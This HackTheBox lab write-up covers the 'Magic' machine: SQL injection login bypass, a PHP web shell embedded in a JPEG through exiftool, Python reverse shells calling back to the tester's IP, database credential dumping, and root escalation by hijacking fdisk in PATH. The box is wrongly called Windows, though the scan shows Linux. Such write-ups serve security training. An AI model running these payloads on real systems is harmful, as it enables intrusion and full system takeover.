# Magic HackTheBox

![](/home/strawhack/Videos/Git/Magic/Image/1.png)



HackTheBox also called as HTB in short, is a platform which host a large number of vulnerable machines. This gives opportunity for students,  pen-tester, researchers and other enthusiast to carry out pen-testing to improve their skills. The aim of the vulnerable box is to exploit the  various vulnerabilities present on the box and to obtain the User and  Root flag.

Today we are going to look at a box named Magic which is created by __"TRX"__. The box is rated as easy on HTB platform and is hosted on Windows OS.

## Reconnaissance

The first step towards finding any vulnerability is to find which ports are **Open**. To find open ports, we use a tool named **Nmap**.

```bash
nmap -sC -sV 10.10.10.185
Nmap scan report for 10.10.10.185
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the above Nmap scan, we find two ports are open viz Port 22 which host SSH service and Port 80 which is HTTP port.

Opening Port 80 in browser, we see



![](/home/strawhack/Videos/Git/Magic/Image/2.png)

At the bottom of the page, we see __"Login"__. Clicking it, we are prompted with a Login prompt.

![]()![3](/home/strawhack/Videos/Git/Magic/Image/3.png)

Trying basic SQL Injection 



![](/home/strawhack/Videos/Git/Magic/Image/4.png)

We successfully login and are provided with __"Upload Image"__  option.

![](/home/strawhack/Videos/Git/Magic/Image/5.png)

Uploading a image file, the file gets uploaded. To find the location where the file gets saved, lets run a tool named Gobuster.

```ruby
gobuster dir -u http://10.10.10.185 -w /opt/Dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.185
[+] Threads:        10
[+] Wordlist:       /opt/Dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/22 11:09:54 Starting gobuster
===============================================================
/images (Status: 301)
/assets (Status: 301)
```

We have /images, lets directory brute force using Gobuster

```ruby
dir -u http://10.10.10.185/images -w /opt/Dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.185/images
[+] Threads:        10
[+] Wordlist:       /opt/Dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/22 11:11:13 Starting gobuster
===============================================================
/uploads (Status: 301)
```

Lets check whether our image file named kenshin.jpeg is saved in /images/uploads

![](/home/strawhack/Videos/Git/Magic/Image/6.png)

We know the location where files get saved. Trying to upload a PHP Reverse Shell we get the following error.

![](/home/strawhack/Videos/Git/Magic/Image/7.png)



It seems there is some kind of filter. We can bypass this by embedding PHP code in an image using tool named __"ExifTool"__.

```css
strawhack@linux:~/Desktop$exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); _halt_compiler() ?>' kenshin.jpeg
1 image files updated

strawhack@linux:~/Desktop$ls
kenshin.jpeg  kenshin.jpeg_original

strawhack@linux:~/Desktop$ mv kenshin.jpeg kenshin.php.jpeg
```

Lets upload the file and try access it.



![](/home/strawhack/Videos/Git/Magic/Image/8.png)

We have a code execution. Lets try to ping our system, we get a response.

![](/home/strawhack/Videos/Git/Magic/Image/9.png)

Its time for Reverse Shell. Taking the code from [PenTest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), 

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.119",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We get a reverse shell

```ruby
strawhack@linux:~/Desktop$ sudo nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.10.185 43600
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/Magic/images/uploads$
```

Going to the user __"theseus"__, we see the user.txt can be accessed by __"theseus"__

```ruby
www-data@ubuntu:/home/theseus$ ls -la
total 84
drwxr-xr-x 15 theseus theseus 4096 Apr 16 02:58 .
drwxr-xr-x  3 root    root    4096 Oct 15  2019 ..
-rw-------  1 theseus theseus 7334 Apr 15 23:50 .ICEauthority
lrwxrwxrwx  1 theseus theseus    9 Oct 21  2019 .bash_history -> /dev/null
-rw-r--r--  1 theseus theseus  220 Oct 15  2019 .bash_logout
-rw-r--r--  1 theseus theseus   15 Oct 21  2019 .bash_profile
-rw-r--r--  1 theseus theseus 3771 Oct 15  2019 .bashrc
drwxrwxr-x 13 theseus theseus 4096 Mar 13 05:57 .cache
drwx------ 13 theseus theseus 4096 Oct 22  2019 .config
drwx------  3 theseus theseus 4096 Oct 21  2019 .gnupg
drwx------  3 theseus theseus 4096 Oct 21  2019 .local
drwx------  2 theseus theseus 4096 Aug 21 22:10 .ssh
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Desktop
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Documents
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Downloads
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Music
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Pictures
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Public
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Templates
drwxr-xr-x  2 theseus theseus 4096 Oct 22  2019 Videos
-r--------  1 theseus theseus   33 Aug 21 20:47 user.txt
```

Lets run [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), for further enumeration

```css
[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/var/www/Magic/db.php5
/var/www/Magic/images
/var/www/Magic/images/fulls
/var/www/Magic/images/uploads
/var/www/Magic/index.php
/var/www/Magic/login.php
/var/www/Magic/logout.php
/var/www/Magic/upload.php
/var/www/Magic/assets
/var/www/Magic/assets/sass
/var/www/Magic/assets/sass/libs
/var/www/Magic/assets/css
/var/www/Magic/assets/css/images
/var/www/Magic/assets/js
/var/www/Magic/assets/webfonts
/var/www/Magic/index.php
```

We see a db.php5 file. Checking the content db.php5

```bash
www-data@ubuntu:/dev/shm$ cd /var/www/Magic/
www-data@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
```

We find the Database credential. Trying to access mysql we get the following error

```ruby
mysql

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.
```

Seems __"mysql"__ is not installed but there __"mysqldump"__ on the target. Lets dump the database __"Magic"__

```ruby
www-data@ubuntu:/var/www/Magic$ mysqldump --databases Magic -u theseus -p
Enter password:
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Current Database: `Magic`
--

CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `Magic`;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-08-21 23:10:57
```

```bash
User:Theseus
Pass:Th3s3usW4sK1ng
```

From the dump, we find credential for Theseus. Using switch user command, we can switch to Theseus.

```css
www-data@ubuntu:/var/www/Magic$ su - theseus
su - theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:~$
```

## User Flag

```ruby
theseus@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
theseus@ubuntu:~$ cat user.txt
d4e98c72007d8e34----------------
```

The current shell is bit unstable. Lets login via SSH.

```bash
strawhack@linux:~/Desktop$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/strawhack/.ssh/id_rsa): theseus
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in theseus
Your public key has been saved in theseus.pub
The key fingerprint is:
SHA256:cS1yfDBgzHmOtvpGvG7Jm6XDwmtnenxrjyAPqhd1RbY strawhack@linux
The key's randomart image is:
+---[RSA 3072]----+
|       oo+=      |
|       .+oo=     |
|        o=E o    |
|      . +=.o     |
|     . +S.       |
|    .   +        |
|     oo*.o.      |
|    ..=+&=o.     |
|  .o..o%B=oo.    |
+----[SHA256]-----+
```

Copy the Public Key in Theseus's authorized_keys, and login using SSH

```ruby
strawhack@linux:~/Desktop$ ssh -i theseus theseus@10.10.10.185
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

29 packages can be updated.
0 updates are security updates.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
theseus@ubuntu:~$
```

Lets again run [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), for further enumeration

```bash
[+] Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
-rw-r-----+ 1 root systemd-journal 16777216 Mar 13 05:56 /var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000@b09569a072514b7caf917784aef6bb3d-00000000000009b7-000594f1d2b2d772.journal
-rw-r-----+ 1 root systemd-journal 16777216 Apr 14 04:47 /var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000@b09569a072514b7caf917784aef6bb3d-000000000000a2d1-0005a0bbfeaf7e8e.journal
-rw-r-----+ 1 root systemd-journal 8388608 Aug 21 23:15 /var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000@b09569a072514b7caf917784aef6bb3d-000000000000fc2b-0005a33ec50e1895.journal
-rw-r-----+ 1 root systemd-journal 8388608 Aug 21 23:23 /var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000.journal
```

The file /bin/sysinfo looks strange. Checking the executable using strings we see fdisk is not called from absolute path. 

```bash
theseus@ubuntu:/dev/shm$ strings /bin/sysinfo
/lib64/ld-linux-x86-64.so.2
libstdc++.so.6
-------------snipped-----------------
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
```

Checking the $PATH

```bash
theseus@ubuntu:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Lets create a fdisk binary in /dev/shm which contains a python3 reverse shell. Lets modify the path as shown below.

```ruby
theseus@ubuntu:/dev/shm$ nano fdisk
theseus@ubuntu:/dev/shm$ cat fdisk
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.119",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
theseus@ubuntu:/dev/shm$ chmod +x fdisk
theseus@ubuntu:/dev/shm$ export PATH=/dev/shm:$PATH
theseus@ubuntu:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@ubuntu:/dev/shm$ which fdisk
/dev/shm/fdisk
```

Lets open a netcat listener on our system on port 8001 and execute /bin/sysinfo to get a Reverse Shell

```ruby
strawhack@linux:~/Desktop$ sudo nc -nlvp 8001
Listening on 0.0.0.0 8001
Connection received on 10.10.10.185 35984
# /bin/bash -i
root@ubuntu:/dev/shm# cd /root
cd /root
root@ubuntu:/root# ls
ls
info.c
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
eb8c0d0b143fd1c0----------------
```



## Links 

| Description                | Web URI                                                      |
| -------------------------- | ------------------------------------------------------------ |
| ExifTool To Embed PHP Code | https://medium.com/@noobintheshell/htb-networked-writeup-aa71bff6baa |
| Python3 Reverse Shell      | http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet |
| Linpeas                    | https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite |

